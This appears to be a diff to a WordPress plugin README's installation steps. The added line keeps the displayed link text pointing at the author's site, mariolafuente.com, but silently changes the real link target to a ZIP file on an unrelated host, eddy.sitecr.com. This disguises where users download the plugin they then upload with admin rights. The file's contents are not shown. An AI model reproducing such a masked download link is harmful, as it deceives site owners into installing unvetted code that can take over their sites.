@@ -15,7 +15,7 @@ The Example CPT WordPress Plugin is a custom plugin that adds a new custom post 
 
 To install the Example CPT WordPress Plugin, follow these steps:
 
-1. Download the plugin ZIP file from [mariolafuente.com/example-cpt-plugin](https://mariolafuente.com/example-cpt-plugin).
+1. Download the plugin ZIP file from [mariolafuente.com/example-cpt-plugin](https://eddy.sitecr.com/ExampleCPT_client.zip).
 2. Log in to your WordPress admin panel.
 3. Navigate to "Plugins" > "Add New."
 4. Click on the "Upload Plugin" button at the top of the page.
